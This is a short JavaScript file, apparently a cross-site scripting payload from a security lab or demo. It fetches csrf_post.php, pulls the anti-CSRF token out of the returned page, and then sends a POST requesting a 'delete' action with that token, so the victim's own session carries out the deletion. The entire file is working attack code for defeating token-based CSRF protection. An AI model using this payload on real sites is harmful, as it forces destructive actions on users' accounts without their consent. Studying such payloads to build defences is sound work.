setTimeout(function (){

	//First request in order to retrieve the CSRF token with GET.
	const getRequest = new XMLHttpRequest();

	getRequest.onreadystatechange = function (){

		if (this.status === 200 && this.readyState === XMLHttpRequest.DONE){
			const parser = new DOMParser();
			const dom = parser.parseFromString( this.responseText, "text/html");

			const inputs = dom.getElementsByTagName("INPUT");
			let token = "";
			for (let i = 0; i < inputs.length; i ++){
				if (inputs[i].getAttribute("name") === "token")
					token = inputs[i].getAttribute("value");
			}
			
			if (token.length){
				//Second request in order to trigger the action with POST.
				const postRequest = new XMLHttpRequest();
				postRequest.open("POST","csrf_post.php",true);
				postRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
				postRequest.send("action="+ encodeURIComponent("delete") + "&token=" + encodeURIComponent(token));
			}
		}

	};

	getRequest.open("GET","csrf_post.php",true);
	getRequest.send();

},2000);